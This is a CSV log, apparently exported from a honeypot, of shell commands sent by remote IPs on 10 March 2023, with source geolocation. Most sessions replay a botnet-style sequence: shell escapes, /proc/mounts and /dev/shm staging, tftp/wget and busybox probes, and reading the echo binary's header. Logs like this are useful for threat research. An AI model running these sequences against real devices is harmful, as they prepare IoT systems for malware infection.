@timestamp,input.keyword,src_ip,geoip.city_name,geoip.country_name
"Mar 10, 2023 @ 14:54:59.831",shell,113.26.227.29,-,China
"Mar 10, 2023 @ 14:54:59.830",system,113.26.227.29,-,China
"Mar 10, 2023 @ 14:54:59.829",system,113.26.227.29,-,China
"Mar 10, 2023 @ 14:54:59.827",enable,113.26.227.29,-,China
"Mar 10, 2023 @ 14:46:04.263",rm .s; exit,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:04.261",/bin/busybox YFLZC,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:03.975",while read i,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:03.972",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:03.671",tftp; wget; /bin/busybox YFLZC,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:03.381",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YFLZC,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:03.078",cat /proc/mounts; /bin/busybox YFLZC,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:02.791",sh,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:02.790",shell,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:02.789",shell,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:02.788",system,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:02.787",system,117.214.255.181,-,India
"Mar 10, 2023 @ 14:46:02.785",enable,117.214.255.181,-,India
"Mar 10, 2023 @ 14:37:39.496",cat /bin/echo;,109.206.243.207,-,Germany
"Mar 10, 2023 @ 13:42:54.372",rm .s; exit,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:54.370",/bin/busybox YWKJN,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:54.086",while read i,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:54.082",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:53.786",tftp; wget; /bin/busybox YWKJN,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:53.500",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YWKJN,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:53.211",cat /proc/mounts; /bin/busybox YWKJN,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:52.925",sh,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:52.924",shell,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:52.923",shell,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:52.922",system,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:52.921",system,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 13:42:52.919",enable,117.205.96.94,Meerut,India
"Mar 10, 2023 @ 12:57:40.670",uname -s -v -n -r -m,123.156.231.91,Jinhua,China
"Mar 10, 2023 @ 12:30:36.337",uname -a,8.213.24.214,Singapore,Singapore
"Mar 10, 2023 @ 12:16:32.670",rm .s; exit,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:32.668",/bin/busybox MJXGE,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:32.401",while read i,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:32.398",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:32.124",tftp; wget; /bin/busybox MJXGE,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.846",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MJXGE,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.561",cat /proc/mounts; /bin/busybox MJXGE,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.277",sh,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.276",shell,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.275",shell,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.275",system,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.274",system,42.243.253.211,-,China
"Mar 10, 2023 @ 12:16:31.272",enable,42.243.253.211,-,China
"Mar 10, 2023 @ 12:10:44.281",/bin/busybox PEIFN,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:44.047",while read i,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:44.042",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.789",tftp; wget; /bin/busybox PEIFN,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.546",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PEIFN,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.295",cat /proc/mounts; /bin/busybox PEIFN,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.054",sh,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.053",shell,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.052",shell,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.051",system,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.050",system,110.178.37.27,-,China
"Mar 10, 2023 @ 12:10:43.046",enable,110.178.37.27,-,China
"Mar 10, 2023 @ 11:09:45.513",uname -s -v -n -r -m,47.243.63.173,San Mateo,United States
"Mar 10, 2023 @ 10:29:59.608",rm .s; exit,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:59.552",/bin/busybox BDEXQ,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:59.328",while read i,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:59.270",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.991",tftp; wget; /bin/busybox BDEXQ,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.720",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox BDEXQ,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.440",cat /proc/mounts; /bin/busybox BDEXQ,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.176",shell,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.176",sh,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.175",shell,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.124",system,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.105",system,222.241.50.50,-,China
"Mar 10, 2023 @ 10:29:58.103",enable,222.241.50.50,-,China
"Mar 10, 2023 @ 09:32:59.196",rm .s; exit,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:59.184",/bin/busybox EEQUZ,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:58.970",while read i,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:58.939",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:58.711",tftp; wget; /bin/busybox EEQUZ,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:58.459",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox EEQUZ,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:58.218",cat /proc/mounts; /bin/busybox EEQUZ,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.997",sh,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.996",shell,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.995",shell,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.994",system,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.993",system,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:32:57.991",enable,117.80.126.215,Suzhou,China
"Mar 10, 2023 @ 09:11:52.321",/bin/busybox RVZEV,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:52.087",while read i,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:52.084",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.845",tftp; wget; /bin/busybox RVZEV,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.610",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RVZEV,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.371",cat /proc/mounts; /bin/busybox RVZEV,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.137",sh,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.137",shell,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.136",shell,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.135",system,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.134",system,110.181.75.222,-,China
"Mar 10, 2023 @ 09:11:51.132",enable,110.181.75.222,-,China
"Mar 10, 2023 @ 08:40:58.433",/bin/busybox LFOHI,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:58.208",while read i,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:58.204",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.977",tftp; wget; /bin/busybox LFOHI,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.747",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LFOHI,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.501",cat /proc/mounts; /bin/busybox LFOHI,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.268",sh,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.267",shell,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.267",shell,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.266",system,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.265",system,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.263",enable,49.70.13.51,-,China
"Mar 10, 2023 @ 08:04:44.552",rm .s; exit,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:44.515",/bin/busybox TJKDS,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:44.270",while read i,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:44.263",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.998",tftp; wget; /bin/busybox TJKDS,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.706",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TJKDS,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.414",cat /proc/mounts; /bin/busybox TJKDS,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.158",sh,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.157",shell,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.157",shell,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.156",system,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.155",system,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.153",enable,223.8.205.227,-,China
"Mar 10, 2023 @ 07:30:10.697",rm .s; exit,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:10.695",/bin/busybox FVJIZ,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:10.453",while read i,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:10.450",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:10.203",tftp; wget; /bin/busybox FVJIZ,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:09.960",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FVJIZ,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:09.195",cat /proc/mounts; /bin/busybox FVJIZ,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.951",sh,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.950",shell,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.949",shell,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.948",system,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.948",system,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.945",enable,222.246.108.141,Changde,China
"Mar 10, 2023 @ 06:04:20.322",rm .s; exit,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:20.145",/bin/busybox NWMXZ,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:19.883",while read i,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:19.880",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:19.564",tftp; wget; /bin/busybox NWMXZ,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:19.297",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NWMXZ,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.710",cat /proc/mounts; /bin/busybox NWMXZ,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.411",sh,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.410",shell,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.410",shell,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.409",system,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.400",system,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.398",enable,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 05:20:14.090",rm .s; exit,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:14.087",/bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:13.831",while read i,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:13.828",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:13.555",tftp; wget; /bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:13.297",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:13.016",cat /proc/mounts; /bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.755",sh,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.753",shell,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.752",shell,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.751",system,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.750",system,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.749",enable,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:06:54.153",rm .s; exit,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:54.139",/bin/busybox MZUEG,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:53.858",while read i,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:53.842",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:53.566",tftp; wget; /bin/busybox MZUEG,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:53.270",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MZUEG,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.974",cat /proc/mounts; /bin/busybox MZUEG,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.680",sh,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.679",shell,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.678",system,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.678",shell,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.677",system,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.658",enable,110.182.124.16,-,China
"Mar 10, 2023 @ 04:53:50.646",rm .s; exit,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:50.630",/bin/busybox OZPCS,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:50.362",while read i,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:50.359",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:50.073",tftp; wget; /bin/busybox OZPCS,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.792",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OZPCS,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.504",cat /proc/mounts; /bin/busybox OZPCS,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.217",sh,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.216",shell,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.215",shell,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.213",system,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.213",system,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.211",enable,106.41.74.164,-,China
"Mar 10, 2023 @ 04:39:18.159",rm .s; exit,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:18.156",/bin/busybox UTOYA,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:17.902",while read i,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:17.898",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:17.640",tftp; wget; /bin/busybox UTOYA,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:17.370",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UTOYA,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:17.098",cat /proc/mounts; /bin/busybox UTOYA,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:16.841",sh,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:16.840",shell,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:16.839",shell,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:16.836",system,123.185.223.115,Dalian,China
